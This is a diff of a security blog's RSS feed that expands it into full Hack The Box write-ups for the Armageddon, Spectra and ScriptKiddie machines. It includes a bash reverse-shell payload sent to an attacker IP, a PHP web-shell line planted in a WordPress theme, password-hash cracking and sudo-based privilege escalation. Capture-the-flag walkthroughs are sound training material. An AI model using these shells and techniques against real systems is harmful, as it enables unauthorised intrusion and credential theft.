@@ -1,60 +1,2693 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>hacking - Category - Masoopy</title><link>https://www.masoopy.com/categories/hacking/</link><description>hacking - Category - Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 31 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.masoopy.com/categories/hacking/" rel="self" type="application/rss+xml"/><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>hacking - Category - Masoopy</title><link>https://www.masoopy.com/categories/hacking/</link><description>hacking - Category - Masoopy</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 31 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.masoopy.com/categories/hacking/" rel="self" type="application/rss+xml"/><item><title>HTB - Armageddon without MetaSploit</title><link>https://www.masoopy.com/htb-armageddon-without-metasploit/</link><pubDate>Sat, 31 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-armageddon-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/07/Armageddon_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro During this box, we&rsquo;ll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I&rsquo;ll get privesc thanks to an insecure sudo command (once again).
-Target HTB - Armageddon
-Recon A quick look to the box info reveals it&rsquo;s running Linux.
-Enum We run our classic nmap scan :
-1  sudo nmap -sC -sV -oA scans\armageddon   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  sudo nmap -sC -sV -oA scans/nmap $attacker_ip Starting Nmap 7.]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>During this box, we&rsquo;ll exploit an outdated version of Drupal in order to get an initial shell. This will allow me to discover user credentials on the Drupal DB. Finally, I&rsquo;ll get privesc thanks to an insecure sudo command (once again).</p>
+<h2 id="target">Target</h2>
+<p><a href="https://app.hackthebox.eu/machines/323" target="_blank" rel="noopener noreferrer">HTB - Armageddon</a></p>
+<h2 id="recon">Recon</h2>
+<p>A quick look to the box info reveals it&rsquo;s running Linux.</p>
+<h2 id="enum">Enum</h2>
+<p>We run our classic <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\armageddon
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/nmap $attacker_ip
+ 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-08 08:51 CEST
+Nmap scan report for $attacker_ip
+Host is up (0.025s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.48 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>The above scans confirms we are facing a Linux box with only Apache and SSH running.</p>
+<p>The <code>CHANGELOG.txt</code> shows a <code>Drupal 7.56</code> version :</p>
+<p></p>
+<p>After a quick look on <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer">exploitDB</a>, we&rsquo;ll notice that this version should be vulnerable to <code>Drupalgeddon2</code>.</p>
+<p>Let&rsquo;s see!</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>NB: I like to use searchsploit directly in my terminal, it makes it easier to show an exploit with <code>searchsploit -x relative_path</code> and <code>searchsploit -m relative_path</code> in order to mirror (eg. copy the exploit in my current directory).</p>
+<p>In our case, we&rsquo;ll be using : <code>searchsploit -m php/webapps/44449.rb</code>.</p>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>After firing it up, we&rsquo;ll get a shell :</p>
+<p></p>
+<p>From here, we can get the Drupal config inside <code>sites/default/settings.php</code> and find <code>MySQL credentials</code> :</p>
+<p></p>
+<p>Once, we have the creds, we can try to dump the db, with <code>mysqldump</code>, but we&rsquo;ll gt an error about a bad character (&gt;). We,then, shall upgrade our shell.</p>
+<p>Let&rsquo;s fire up <code>Burp</code>, with the following request and a <code>nc listener</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">POST /shell.php HTTP/1.1
+Host: $attacker_ip
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: has_js=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+
+c=bash+-i+&gt;%26+/dev/tcp/10.10.14.11/443+0&gt;%261
+</code></pre></td></tr></table>
+</div>
+</div><p>NB : In case you are wondering, I am using the <code>shell.php</code> from the exploit, and I simply copy pasted the URL in browser, captured it with Burp, and converted to POST. Then, I could run a better script.</p>
+<p>Once it is done, we can dump the DB like so :</p>
+<p><code>mysqldump -u drupaluser -p drupal &gt; plop.sql</code></p>
+<p>We now look inside the dump and search for user&rsquo;s information :</p>
+<p></p>
+<p>It appears our user is called <code>brucetherealadmin</code> and it&rsquo;s hash starts with <code>$S$</code> according to <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">hashcat</a>, it is a Drupal 7 hash, which we can confirm it is!</p>
+<p>Now to crack it :</p>
+<p><code>hashcat -m 7900 arma.hash /usr/share/wordlists/rockyou.txt</code></p>
+<p>After a little while, the password will be cracked :</p>
+<p></p>
+<h3 id="getting-users-shell">Getting User&rsquo;s Shell</h3>
+<p>We can now log in via SSH as <code>brucetherealadmin</code> with the just cracked password, and grab <code>user's flag</code> :</p>
+<p></p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Now that we are in, the first thing I like to do is checking if I have <code>sudo</code>&rsquo;s rights. This might be an easy win and it is a lot quieter than running a script such as <code>LinPeas</code>.</p>
+<p>Bruce can indeed run <code>sudo snap install</code> :</p>
+<p></p>
+<p>When I first did the box, there was nothing on <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but since there is today, let&rsquo;s do it the easy way!</p>
+<p>We simply modify the first line, replacing <code>id</code> command with <code>cat /root/root.txt</code>.</p>
+<p>Finally, we run it like : <code>sudo snap install plop_1.0_all.snap --dangerous --devmode</code> in order to get root&rsquo;s flag:</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>I remember loving the first part until user&hellip; but the last part was just horrible. I hated it ! It was actually so painful, that I didn&rsquo;t take any note on the privesc and didn&rsquo;t even planned to do the writeup&hellip; but here I am!</p>
+]]></description></item><item><title>HTB - Spectra without MetaSploit</title><link>https://www.masoopy.com/htb-spectra-without-metasploit/</link><pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-spectra-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/07/Spectra_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro This is an easy Linux box, where I had to get user through a forgotten &ldquo;backup&rdquo; on a dev instance, then the privesc came from an unsecured sudo command&hellip; Sounds straightforward ? Well, not that much!
-Target HTB - Spectra
-Recon A quick look to the box info reveals that it is a Linux&rsquo;s box, and that&rsquo;s it!
-Enum We run our classic nmap scan :
-1  sudo nmap -sC -sV -oA scans\spectra   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  Starting Nmap 7.]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>This is an easy Linux box, where I had to get user through a forgotten &ldquo;backup&rdquo; on a dev instance, then the privesc came from an unsecured sudo command&hellip; Sounds straightforward ? Well, not that much!</p>
+<h2 id="target">Target</h2>
+<p><a href="https://app.hackthebox.eu/machines/317" target="_blank" rel="noopener noreferrer">HTB - Spectra</a></p>
+<h2 id="recon">Recon</h2>
+<p>A quick look to the box info reveals that it is a Linux&rsquo;s box, and that&rsquo;s it!</p>
+<h2 id="enum">Enum</h2>
+<p>We run our classic <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans\spectra
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 15:23 CEST
+Nmap scan report for $target_ip
+Host is up (0.028s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
+80/tcp   open  http    nginx 1.17.4
+|_http-server-header: nginx/1.17.4
+|_http-title: Site doesn&#39;t have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.50 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>Only 3 ports are open : http, mysql, and SSH.</p>
+<h3 id="web-enum">Web enum</h3>
+<p>Since I found a website, I&rsquo;ll manually browse to it in order to have a quick look. In the mean time, I&rsquo;ll fire up a <code>gobuster</code> scan against the IP :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://spectra.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2021/05/27 15:27:27 Starting gobuster in directory enumeration mode
+===============================================================
+/main                 (Status: 301) [Size: 169] [--&gt; http://spectra.htb/main/]
+/testing              (Status: 301) [Size: 169] [--&gt; http://spectra.htb/testing/]
+                                                                                 
+===============================================================
+2021/05/27 15:31:27 Finished
+===============================================================
+</code></pre></td></tr></table>
+</div>
+</div><p>Main page shows 2 links pointing to <a href="http://spectra.htb" target="_blank" rel="noopener noreferrer">spectra.htb</a>, this means I need to modify our <code>/etc/hosts</code> file accordingly. One instance (main) is a working Wordpress, and the other one (testing) is a broken Wordpress.</p>
+<p>Once this is done, I would generally run a few more <code>gobuster</code> scans in the background against those two instances and a <code>WPScan</code> on the working Wordpress :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://spectra.htb/main/ [target.ip]
+[+] Started: Thu May 27 15:29:13 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: nginx/1.17.4
+ |  - X-Powered-By: PHP/5.6.40
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://spectra.htb/main/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://spectra.htb/main/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
+ |  - http://spectra.htb/main/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwenty
+ | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/
+ | Last Updated: 2021-03-09T00:00:00.000Z
+ | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt
+ | [!] The version is out of date, the latest version is 1.7
+ | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2
+ | Style Name: Twenty Twenty
+ | Style URI: https://wordpress.org/themes/twentytwenty/
+ | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: &#39;Version: 1.2&#39;
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 &lt;===============================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Thu May 27 15:29:22 2021
+[+] Requests Done: 170
+[+] Cached Requests: 5
+[+] Data Sent: 43.305 KB
+[+] Data Received: 357.271 KB
+[+] Memory used: 203.707 MB
+[+] Elapsed time: 00:00:09
+</code></pre></td></tr></table>
+</div>
+</div><p>This scan didn&rsquo;t reveal anything useful, I also tried to brute force <code>administrator</code> user with a top 1000 passwords list from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer">SecLists</a>. No luck.</p>
+<p>I decided to run the <code>WPScan</code> first, while browsing manually the other (testing) instance. Pretty quickly, I figured out that <code>directory listing</code> was enabled on this instance, this means that browsing to <code>http://spectra.htb/testing/</code> instead of <code>http://spectra.htb/testing/index.php</code> gave me the full listing of files on the web root.</p>
+<p>From here, I could spot a <code>wp-config.php.save</code> file that contained credentials to connect to the database.</p>
+<p>I tried connecting remotely, but MySQL wouldn&rsquo;t allow me to connect from my IP.</p>
+<p>Finally, I tried logging on the working Wordpress' instance as <code>administrator</code> and with the password I found, and it worked! I was in!</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>Once you are logged with admin priv on a Wordpress, getting a shell is, as far as I have seen, very easy! Basically, it is about editing a theme (preferably an unused one), and adding a small line of <code>PHP</code> in order to get some kind of <code>RCE</code>.</p>
+<p>In this case, I edited theme <code>twentyseven</code>, file <code>404.php</code> and added the following line : <code>echo system($_REQUEST['nes']);</code></p>
+<p>This means, that I can now run commands like so (directly in browser, or via Curl, Burp, etc) :</p>
+<p><code>curl http://spectra.htb/main/themes/twentyseven/404.php&amp;nes=whoami</code></p>
+<p>From here, I like to use Burp, convert the request to <code>POST</code> and play around or simply get a better shell.</p>
+<p>On this particular box, I had several issues trying to get a proper shell.</p>
+<p>I decided to upload a full php reverse shell via curl&hellip; I then reached that URL to get my reverse shell, and&hellip; I couldn&rsquo;t <a href="https://www.masoopy.com/cheatsheets/uprgrading-shells/" target="_blank" rel="noopener noreferrer">upgrade it</a>! However, I noticed that <code>nginx</code> user had a real shell inside <code>/etc/passwd</code>, so I uploaded my <code>ssh key</code> and connected as <code>nginx</code> over <code>SSH</code>!</p>
+<p>From here, I ran <code>LinPeas</code> and spotted (not easily) and interesting file : <code>/etc/autologin/passwd</code></p>
+<h4 id="getting-user">Getting user</h4>
+<p>The password found allowed me to log in as <code>katie</code> via ssh, and allowed me to grab the <code>user flag</code> :</p>
+<p></p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Now that I have user, let&rsquo;s see if I can run sudo, and indeed I can run <code>sudo /sbin/initctl</code> without password. I headed over <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFObins</a>, but unfortunately there was nothing there.</p>
+<p>After a little exploration, I noticed that I could <code>edit</code> / <code>start</code> / <code>stop</code> services in <code>/etc/init/</code>, and found a particularly interesting one called test.conf.</p>
+<p></p>
+<p>After more trial and errors, I simply decided to replace the <code>date</code> command by <code>cat /root/root.txt</code>, which got me the <code>root flag</code> from log file in <code>/var/log/nodetest.log</code> :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>This was another fun with quite a few unexpected hurdles. It was really cool to &ldquo;think out of the box&rdquo; and try to find (ugly) ways to overcome those issues.</p>
+]]></description></item><item><title>HTB - ScriptKiddie</title><link>https://www.masoopy.com/htb-scriptkiddie/</link><pubDate>Thu, 10 Jun 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-scriptkiddie/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/06/SK_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro Target HTB - ScriptKiddie
-Recon Initial recon tells us the box is running Linux, and that&rsquo;s about it!
-Enum During the enum phase
-1  sudo nmap -sC -sV -oA scans/fast $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # Nmap 7.91 scan initiated Mon May 17 15:00:50 2021 as: nmap -sC -sV -oA scans/fast $target_ip Nmap scan report for $target_ip Host is up (0.]]></description></item><item><title>THM - DailyBugle without MetaSploit</title><link>https://www.masoopy.com/thm-dailybugle-without-metasploit/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/thm-dailybugle-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<h2 id="target">Target</h2>
+<p><a href="https://app.hackthebox.eu/machines/314" target="_blank" rel="noopener noreferrer">HTB - ScriptKiddie</a></p>
+<h2 id="recon">Recon</h2>
+<p>Initial recon tells us the box is running Linux, and that&rsquo;s about it!</p>
+<h2 id="enum">Enum</h2>
+<p>During the enum phase</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/fast $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text"># Nmap 7.91 scan initiated Mon May 17 15:00:50 2021 as: nmap -sC -sV -oA scans/fast $target_ip
+Nmap scan report for $target_ip
+Host is up (0.037s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d&#39;5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon May 17 15:00:58 2021 -- 1 IP address (1 host up) scanned in 8.98 second
+</code></pre></td></tr></table>
+</div>
+</div><p>From this we discover an <code>SSH</code> service and a <code>Python webserver</code> on port 5000. It also confirms we are facing a Linux box.</p>
+<p>Manually browsing to the website, we find that there are 3 tools : <code>nmap</code>, <code>searchsploit</code> anf <code>msfvenom</code>. After a few tries with <code>ffuf</code>, and <code>gobuster</code>, we couldn&rsquo;t find anything interesting.</p>
+<p>However, after a quick search, <code>msfvenom</code> might be <a href="https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Let&rsquo;s test our theory and see if we can get a shell.</p>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>In order to do so, we will fire up <code>MetaSploit</code> and generate a payload (we could also <a href="https://www.exploit-db.com/exploits/49491" target="_blank" rel="noopener noreferrer">download</a> a payload and slightly modify it).</p>
